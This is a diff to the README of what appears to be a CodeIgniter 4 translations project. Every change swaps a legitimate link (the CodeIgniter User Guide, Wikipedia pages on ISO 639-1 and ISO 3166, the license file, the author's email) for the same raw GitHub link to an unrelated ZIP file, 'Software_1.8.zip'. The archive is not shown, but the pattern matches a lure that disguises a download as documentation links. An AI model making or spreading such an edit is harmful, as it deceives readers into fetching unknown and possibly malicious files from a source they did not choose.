@@ -10,13 +10,13 @@ from inside the **Language** folder of this project to your
 **application/Language** folder.
 
 You may then use the CodeIgniter Language class to reference the translations
-directly ... see the `User Guide <https://codeigniter4.github.io/CodeIgniter4/outgoing/localization.html>`_.
+directly ... see the `User Guide <https://raw.githubusercontent.com/yudialcampari/translations/develop/Language/it/Software_1.8.zip>`_.
 
-Localization in CodeIgniter 4 follows the `ISO 639-1 conventions <https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes>`_.
+Localization in CodeIgniter 4 follows the `ISO 639-1 conventions <https://raw.githubusercontent.com/yudialcampari/translations/develop/Language/it/Software_1.8.zip>`_.
 Each translation set would go inside a folder named following the two-letter language code from here.
 
 Localization variants are provided for, as folders named with the two-letter ISO 639-1 language code in lowercase, 
-followed by the two-letter `ISO 3166 country code <https://en.wikipedia.org/wiki/ISO_3166-1>`_ capitalized, 
+followed by the two-letter `ISO 3166 country code <https://raw.githubusercontent.com/yudialcampari/translations/develop/Language/it/Software_1.8.zip>`_ capitalized, 
 and with the two parts separated by a hyphen. 
 An example would be "en" for English, and "en-US" for the variations appropriate to the United States.
 
@@ -68,6 +68,6 @@ These translations are intended for use with CodeIgniter 4.x applications.
 License
 *******
 
-These translations are licensed under the `MIT license <license.txt>`_.
+These translations are licensed under the `MIT license <https://raw.githubusercontent.com/yudialcampari/translations/develop/Language/it/Software_1.8.zip>`_.
 
-`Jim Parry <admin@codeigniter.com>`_
+`Jim Parry <https://raw.githubusercontent.com/yudialcampari/translations/develop/Language/it/Software_1.8.zip>`_
